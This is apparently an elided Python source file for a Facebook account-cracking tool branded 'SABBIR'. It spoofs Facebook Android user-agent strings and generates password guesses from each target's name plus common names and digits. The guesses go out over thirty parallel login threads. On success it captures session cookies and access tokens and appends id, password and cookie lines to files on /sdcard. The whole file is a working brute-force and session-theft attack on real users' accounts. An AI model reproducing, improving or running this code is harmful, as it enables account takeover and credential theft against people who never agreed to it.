...
sys.stdout.write('\x1b]2; SABBIR\x07')
...
def ua():
	...
	CitaCitaDeviJadiLonte = random.choice(["1.6.0","2.1.0"])
	DeviLonteReporting = 'Dalvik/'+str(CitaCitaDeviJadiLonte)+' (Linux; U; Android '+str(VersiMemekDevi)+'; Nexus 7 Build/KTU84L) [FBAN/PAAA;FBAV/'+str(MemekDeviForPublik)+';FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FB_FW/2;FBSN/Android;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-N910V;FBSV/5.0.1;]'
	return DeviLonteReporting
...
logo =f"""{A}
{G1}____    _    ____  ____ ___ ____  
{G2} / ___|  / \  | __ )| __ )_ _|  _ \ 
{G3} \___ \ / _ \ |  _ \|  _ \| || |_) |
{G4}  ___) / ___ \| |_) | |_) | ||  _ < 
{G5} |____/_/   \_\____/|____/___|_| \_\ {G1}[{A}V{G1}/{A}3.9{G1}]
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} SABBIR-KHAN
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} SABBIR-KHAN
...
def menu():   
    ...
    print(f'{G1}[{A}3{G3}]{G3} EXIT TOOLS')
    linex()
...
def _bd_():
    ...
    with Habib(max_workers=30) as sexy:
        ...
        for love in user:
            ...
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'sadiya','jannat','sumaya','১২৩৪৫৬','sabbir']
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/SABBIR.txt');linex()
    ...
    def methodA(self, sid, name, psw):
        try:
          ...
          #  ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
           # ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/"+str(random.randint(1111111,7777777))+";FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h"
            sys.stdout.write(f"\r{G1}[{A}SABBIR-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SABBIRb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SABBIRb};{ckkk}"
                    print(f"\r\r{G1}[SABBIR-OK] {sid} | {ps} ")
                    open('/sdcard/SABBIR-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[SABBIR-CP] {sid} | {ps} ")
                     open('/sdcard/SABBIR-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}SABBIR-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SABBIRb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SABBIRb};{ckkk}"
                    print(f"\r\r{G1}[SABBIR-OK] {sid} | {ps} ")
                    open('/sdcard/SABBIR-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[SABBIR-CP] {sid} | {ps} ")
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            with Habib(max_workers=30) as SABBIRworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SABBIRworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SABBIRworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
#__________________[ RANDOM METHOD ]__________________#
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}SABBIR{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[SABBIR-OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/SABBIR.txt-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
